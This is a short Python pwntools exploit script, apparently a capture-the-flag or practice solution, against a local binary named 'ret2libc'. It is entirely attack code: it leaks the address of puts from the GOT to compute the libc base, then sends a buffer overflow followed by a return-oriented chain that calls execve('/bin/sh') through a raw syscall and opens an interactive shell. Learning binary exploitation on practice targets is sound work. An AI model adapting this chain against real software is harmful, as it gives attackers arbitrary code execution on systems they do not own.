from pwn import *

r=process('./ret2libc')

put_got =0x601018
put_offset=0x809c0

r.recvuntil(':')
r.send('0x601018')

r.recvuntil('Content:')
put_addr=int(r.recvuntil('\n')[:-1])

# print hex(put_addr)

libc_base=put_addr -put_offset

bin_sh=0x1b3e9a
pop_rdi=0x000000000002155f # pop rdi; ret
pop_rsi=0x0000000000023e6a # pop rsi; ret
pop_rdx=0x0000000000001b96 # pop rdx; ret
pop_rax=0x00000000000439c8 # pop rax; ret
syscall=0x00000000000d2975 # syscall; ret

r.recvuntil(':')

p='a'*0x38
p+=p64(libc_base+pop_rdi)
p+=p64(libc_base+bin_sh)
p+=p64(libc_base+pop_rsi)
p+=p64(0)
p+=p64(libc_base+pop_rdx)
p+=p64(0)
p+=p64(libc_base+pop_rax)
p+=p64(0x3b)
p+=p64(libc_base+syscall)

r.send(p)

r.interactive()
